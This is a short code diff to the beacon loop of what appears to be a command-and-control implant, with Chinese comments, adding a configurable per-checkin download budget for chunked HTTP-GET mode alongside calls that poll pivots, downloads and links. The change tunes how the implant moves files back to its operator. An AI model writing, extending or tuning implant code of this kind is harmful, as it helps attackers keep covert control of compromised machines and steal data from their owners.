@@ -275,10 +275,14 @@ void beacon(LPVOID lpReserved) {
 			pivot_poll(command_shell_callback);
 
 			/* 当我们通过HTTP GET推送数据时，请限制下载速度！ */
-			if (setting_int(SETTING_C2_CHUNK_POST) == 0)
+			if (setting_int(SETTING_C2_CHUNK_POST) == 0) {
 				download_poll(command_shell_callback, MAX_PACKET);
-			else
-				download_poll(command_shell_callback, MAX_PACKET_DNS);
+			} else {
+				/* C-56 (.http-post.client_max_post_get_packet): per-checkin
+				 * download budget in chunked-GET mode; 0 = legacy 4096 */
+				int dl_packet = setting_int(SETTING_HTTP_DL_PACKET);
+				download_poll(command_shell_callback, dl_packet > 0 ? dl_packet : MAX_PACKET_DNS);
+			}
 
 			/* 报告所有链接 */
 			link_poll(command_shell_callback);
